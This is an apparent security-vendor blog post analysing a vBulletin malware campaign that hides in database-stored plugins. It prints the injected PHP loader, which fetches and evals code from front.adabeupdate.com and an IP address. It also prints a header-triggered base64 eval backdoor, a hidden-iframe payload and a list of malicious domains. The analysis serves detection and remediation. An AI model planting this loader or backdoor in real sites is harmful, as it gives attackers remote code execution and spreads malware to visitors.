@@ -1,0 +1,65 @@
+vBulletin Infections from Adabeupdate
+
+vBulletin is a popular forum platform that is also starting to become a popular target for web attacks. vBulletin (and vbSEO) had some serious security vulnerabilities in older versions, and when a forum using them is not properly updated, it ends up hosting malware like the one we will analyze here in this post.
+
+Technical Analysis
+vBulletin is very unique on how it stores its templates and plugins, It’s different than WordPress and Joomla, all the content is saved in the database. That makes it a bit more complicated for webmasters because they can’t just use common command line tools (like grep) to search through all their files. They need to use phpMyAdmin or another database tool to try to find and fix those issues.
+
+And that’s where this malware hides itself. It uses the Plugin system and hooks into “global_start”, so it is called on every page request.  This is what the injected PHP looks like in the plugin:
+
+$d = 'front.adabeupdate.com';
+$ip = '91.220.173.170';
+
+ob_start();
+$datad = getdata('http://' . $d . '/ss?t=f&' . $str);
+if ($datad === false) { $datad = getdata('http://' . $ip . '/ss?t=f&' . $str); }
+if (eval($datad) === false) { print $datad; }
+$template_hook['forcehf'] = ob_get_contents();
+ob_end_clean();
+... where getdata is just a wrap around curl.
+
+If you don’t know PHP, the code above does very few things. It contacts the domain front.adabeupdate.com, gets whatever data it sends and displays to the end user. This allows the malware to be injected to the forum pages and pushed down to the visitors of the web site via iFrames. The content is all remotely generated, changing very often, but the format is always the same:
+
+<iframe src="httx://bv5g.gabparenting .com:36/hot.php  height="1" width="1"
+frameborder="0" style=" visibility:hidden; position:absolute"></iframe>
+
+This is an iFrame coming from port 36 or 38 (big red flag there) and from a random domain name. If you are an ISP or hosting provider you can likely block those 2 ports externally to protect your users. These are some of the domains being rotated in the iFrames:
+
+http://grh5.intorcio.com:38/mean.php
+http://rht5.justgabit.com:36/hot.php
+http://bv5g.gabparenting.com:36/hot.php
+http://ferh4.gabmoms.com:36/hot.php
+http://rgh5.gabofporn.com:36/hot.php
+http://sef3.gabfashion.com:36/hot.php
+http://grg5.gabbrazil.com:36/hot.php
+http://fth5.gabafly.com:36/hot.php
+http://fegr4.tampabaypostcarbon.com:38/mean.php
+http://drh4.secularflorida.org:38/mean.php
+http://hrtj5.suncoasthumanist.com:38/mean.php
+http://sef3.instantpartyanddj.com:38/mean.php
+http://grh5.intorcio.com:38/mean.php
+http://ym55.gabandroid.com:36/hot.php
+http://rg56.benpoch.com:36/hot.php
+http://drg4.gab.me:36/hot.php (95.141.37.119)
+
+Some of those are detailed in our labs.
+The backdoor
+Another interesting part of the code injected as plugin into vBulletin is the backdoor. It does not use POST or GET requests, but a custom header sent by the client called HTTP_ECMDE. So whenever it finds that header, it base64 decodes and evals (executes) it:
+
+if ($_SERVER["HTTP_ECMDE"]) {
+eval( base64_decode( $_SERVER["HTTP_ECMDE"]));
+return;
+}
+
+Note that any vBulletin site under our CloudProxy WAF is already being protected against this backdoor.
+Size of this campaign
+It seems to be very popular among vBulletin sites, but due to its conditional nature, it is not always possible to properly measure it. However, we have one small hint of its size. A few weeks ago, the campaign changed from the domain adabeupdate.com to front.adabeupdate.com and the server that hosted adabeupdate.com went down, so all sites compromised were loading very slow by being unable to contact it.
+If the server had display_errors enabled on their PHP settings, it would throw this error for anyone visiting it:
+
+Warning: fopen(http://adabeupdate.com/s?t=h&v=2&tt=1&i=66.249.73.115&a=Mozilla%2F5.0+%28compatible%3B+Googlebot%2F2.1%3B+% ...
+
+During those days, Google indexed more than 15,000 pages with this error. This allowed us to identify hundreds of sites that where compromised and their webmasters have no idea.
+
+This gives us an idea of the size of this attack. Very few sites actually have display_errors enabled, so if Google itself managed to index 15k+ pages with this error, we can probably estimate a number at least 10x more of compromised sites.
+To vBulletin webmasters
+If you own a vBulletin website, you have to keep it always updated. I also recommend going through the plugin list and the template list to make sure there are no additional plugins added. You can always use our website scanner and it will alert if your site is infected (outdated) or not.
